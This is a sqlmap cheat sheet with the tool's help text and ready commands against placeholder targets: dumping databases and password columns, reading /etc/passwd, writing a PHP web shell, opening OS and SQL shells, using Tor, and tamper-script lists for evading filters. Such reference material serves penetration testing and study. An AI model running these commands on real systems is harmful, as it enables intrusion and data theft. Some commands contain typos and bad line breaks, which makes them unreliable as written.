# SQLMap

> sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.

## ❓ Help

```text
Usage: python sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH    SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables. Moreover you can run your own SQL statements

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users
```
## Basics commands
### Simple mapping option
```shell
sqlmap -u "http://example.com/login.php"
```
### POST
```shell
sqlmap -u <POST-URL> --data="<POST-paramters>"
```
### Use TOR SOCKS5 Proxy
> ❗ Note: First active tor service: **service tor start**
```shell
sqlmap -u "http://example.com/login.php" --tor --tor --check-tor --tor-type=SOCKS5 --tor-port=9050 
```
### List all databases located at target site
```shell
sqlmap -u "http://example.com/login.php" --dbs
```
### List all tables in a database
```shell
sqlmap -u "http://example.com/login.php" -D site_db --tables
```
### List all columns in a table
```shell
sqlmap -u "http://example.com/login.php" -D database_name -T users
--columns
```
### Use authentication token
```shell
sqlmap.py -u "http://example.com/login.php" --data="id=1&str=val" --headers= "Authorization: Bearer <token>"
```
### Use authentication cookie
```shell
sqlmap -u "http://example.com/login.php" --data="id=1&str=val" -p
"pid" -b --cookie="cookie1=<cookie_value1>;cookie2=<cookie_value2>"
--random-agent --risk 3 --level 5
```
### Dump all
```shell
sqlmap -u http://example.com/Less-1/?id=1 -D database_name -T
table_name --dump-all
```
### Dump only selected columns
```shell
sqlmap -u "http://example.com/login.php" -D site_db -T users -C
username,password --dump
```
### Dump database table content
```shell
sqlmap -u "http://example.com/login.php" -D database_name -T users
–-dump
```
### File request
```shell
sqlmap.py -r request.txt
```
### Reading file
```shell
sqlmap -u http://localhost/?id=* --file-read=/etc/passwd
```
### Writing file
```shell
sqlmap -u http://example.com/?id=* --file-write=shell.php --
file-dest=/var/www/html/shell-php.php
```
### SQLMap OS Shell
```shell
sqlmap --dbms=mysql -u "http://example.com/login.php" --os-shell
```
### SQLMap SQL Shell
```shell
sqlmap --dbms=mysql -u "http://example.com/login.php" --sql-shell
```
---

## Best tampers
> Add to the desired command
### All scripts
```shell
--tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```
### General scripts
```shell
--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
### Microsoft access
```shell
--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
```
### Microsoft SQL Server
```shell
--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
### MySQL
```shell
--tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
```
### Oracle
```shell
--tamper=between,charencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor
```
### PostgreSQL
```shell
--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,xforwardedfor
```
### SAP MaxDB
```shell
--tamper=ifnull2ifisnull,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,unionalltounion,unmagicquotes,xforwardedfor
```
### SQLite
```shell
--tamper=ifnull2ifisnull,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2dash,space2plus,unionalltounion,unmagicquotes,xforwardedfor
```
### ASP .NET
```shell
--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes

```

## 📚 References

* [sqlmap.org](https://sqlmap.org/)
* [github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
* [tools.kali.org/vulnerability-analysis/sqlmap](tools.kali.org/vulnerability-analysis/sqlmap)
* [gist.github.com/sapran/a12bd98cf212237ac9678d48f5152941](https://gist.github.com/sapran/a12bd98cf212237ac9678d48f5152941)